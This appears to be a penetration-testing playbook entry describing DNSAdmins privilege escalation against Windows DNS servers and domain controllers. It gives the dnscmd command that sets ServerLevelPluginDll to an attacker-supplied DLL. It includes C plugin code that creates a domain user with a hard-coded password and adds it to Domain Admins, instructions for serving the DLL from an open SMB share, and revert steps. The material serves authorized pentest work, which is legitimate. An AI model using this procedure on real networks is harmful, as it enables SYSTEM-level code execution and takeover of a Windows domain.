  A user who is member of the DNSAdmins group or have write privileges to a DNS server object can 
  load an arbitrary DLL with SYSTEM privileges on the DNS server. This is really interesting as the 
  Domain Controllers are used very frequently as DNS servers.

  According to Microsoft protocol specification, the "ServerLevelPluginDll" operation enables us 
  to load a dll of our choosing (with no verification of dll path).

  dnscmd.exe already implements this option: dnscmd.exe /config /serverlevelplugindll \\path\to\dll

  When executing this dnscmd.exe command as a user that is a member of DNSAdmins, the following 
  registry key is populated: 
  HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DNS\Parameters\ServerLevelPluginDll

  Restarting the DNS service will load the DLL in this path; however, the DLL needs to contain 
  "one of the DnsPluginInitialize, DnsPluginCleanup or DnsPluginQuery exports."

    options:
      - tool: Visual Studio
        usage: |
          - download the source code https://github.com/kazkansouh/DNSAdmin-DLL
          - change the DnsPluginInitialize function to something like:

            DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
            {
                system("C:\\Windows\\System32\\net.exe user pentest R2AscpWd2443 /add /domain");
                system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" pentest /add /domain");
            }
          - compile

  - description: Put file on the SMB share if there is no local access to the DNS server
    options:
      - tool: Windows
        usage: If you have access to the Windows host - just create a new share, put it there, allow access to everyone
        comments: Or find any publicly accessible share on the network

      - tool: Linux
        usage: | 
          Add a new block to the /etc/samba/smb.conf file, put the file and restart the service:

          [share]
          path = /tmp/
          browseable = yes
          read only = no
          guest ok = yes
        comments: | 
          It won't work in most cases due to security configuration in modern systems (unauthenticated guest access is forbidden). 
          You need to use a proper windows domain share

  - description: Configure the plugin to run when the DNS server is started
    options:
      - tool: dnscmd.exe
        usage: dnscmd.exe /config /serverlevelplugindll \\<PCNAME>\share\DNSAdmin-DLL.dll
        comments: the path can be local or remote
  
  - description: Wait for the dns service to restart
  
  - description: Revert the configuration after a successful exploitation
    options:
      - tool: dnscmd.exe
        usage: dnscmd.exe /config /serverlevelplugindll ""

comments:
  - This technique is not production safe !!! If there is something wrong with the path or with the dll - DNS service will stop be started.
    Think twice, align the exploitation with the customer.
  - DNSAdmins group membership isn`t required. It`s possible to successfully perform these steps 
    if the account has write access to a DNS server object.
  - In a default configuration, members of the DnsAdmins group do not have special 
    access to start/stop the dns service.
  - Microsoft`s MSRC have been contacted regarding this issue and have stated that it will be 
    fixed by basically only allowing DC administrators to change the ServerLevelPluginDll registry key, 
    and that it will be possible to toggle this feature off in future releases.
